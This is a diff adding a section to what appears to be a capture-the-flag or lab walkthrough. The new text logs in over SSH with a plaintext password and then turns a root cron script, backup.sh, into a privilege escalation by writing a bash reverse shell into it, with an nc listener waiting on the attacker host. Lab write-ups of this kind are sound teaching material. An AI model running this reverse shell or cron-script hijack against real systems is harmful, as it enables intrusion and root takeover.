@@ -212,3 +212,30 @@ chmod +x linpeas.sh
 - We also found a CronJob running under Grimmie’s user, which we will investigate as a possible privilege-escalation opportunity.
 
 
+```bash
+ssh grimmie@192.168.38.139
+yes
+My_V3ryS3cur3_P4ss
+ls
+cat backup.sh
+```
+
+<img width="991" height="610" alt="image" src="https://github.com/user-attachments/assets/1c54dd2c-bc4f-4c9a-af4b-4f80f2a4cc94" />
+<img width="844" height="364" alt="image" src="https://github.com/user-attachments/assets/c7dbe673-33bc-4db2-a15c-6a8dd9b7c2ea" />
+
+
+- Now we found our way to root access on the machine. The script is executed with high privileges, so we can modify its content to execute a reverse shell and set up a listener on the attacker machine. Once the script runs, we should receive a shell with root privileges.
+
+```bash
+nc -nlvp 4444
+```
+
+
+
+```bash
+nano backup.sh
+bash -i >& /dev/tcp/192.168.38.130/4444 0>&1
+```
+
+
+
